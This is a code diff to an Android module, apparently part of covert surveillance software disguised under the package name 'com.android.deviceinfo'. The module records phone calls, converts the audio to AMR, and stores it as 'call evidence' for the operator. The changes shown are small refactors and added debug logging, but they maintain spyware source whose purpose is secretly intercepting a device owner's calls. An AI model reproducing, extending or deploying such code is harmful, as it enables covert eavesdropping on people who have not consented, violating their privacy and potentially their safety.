@@ -9,12 +9,10 @@
 
 package com.android.deviceinfo.module;
 
-import java.io.BufferedInputStream;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.FilenameFilter;
 import java.io.IOException;
@@ -22,16 +20,12 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
-import java.util.ArrayList;
-import java.util.Collections;
 import java.util.Date;
 import java.util.HashMap;
-import java.util.Iterator;
 import java.util.List;
-import java.util.Random;
+import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
 import java.util.concurrent.TimeUnit;
-import java.util.concurrent.BlockingQueue;
 
 import android.media.AmrInputStream;
 import android.media.MediaRecorder;
@@ -40,7 +34,6 @@ import android.os.FileObserver;
 
 import com.android.deviceinfo.Call;
 import com.android.deviceinfo.Device;
-import com.android.deviceinfo.RunningProcesses;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
@@ -59,7 +52,6 @@ import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.DateTime;
 import com.android.deviceinfo.util.Execute;
-import com.android.deviceinfo.util.ExecuteResult;
 import com.android.deviceinfo.util.Instrument;
 import com.android.deviceinfo.util.Utils;
 import com.android.deviceinfo.util.WChar;
@@ -562,6 +554,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private void closeCallEvidence(String number, boolean incoming, Date dateBegin, Date dateEnd) {
 		final byte[] additionaldata = getCallAdditionalData(number, incoming, new DateTime(dateBegin), new DateTime(
 				dateEnd), CHANNEL_LOCAL);
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(closeCallEvidence): closing call for " + number);
+		}
 		
 		EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 	}
@@ -1069,6 +1065,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			String encodedFile = f + ".err";
 			
 			if (encodetoAmr(encodedFile, wave.getBytes())) {
+				Date begin = new Date(first_epoch * 1000L);
+				Date end = new Date(last_epoch * 1000L);
+				
 				int remote;
 				
 				if (encodedFile.endsWith("-r.tmp.err")) {
@@ -1078,15 +1077,17 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				}
 				
 				// Encode to evidence
-				Date begin = new Date(first_epoch * 1000L);
-				Date end = new Date(last_epoch * 1000L);
-				
 				saveCallEvidence("+666", true, begin, end, encodedFile, false, remote);
 				
+				// We have an end of call and it's on both channels
 				if (call_finished) {
 					// After encoding create the end of call marker
 					closeCallEvidence("+666", true, begin, end);
-				}			
+					
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(encodeChunks): end of call reached");
+					}
+				}	
 			}
 			
 			// Remove file
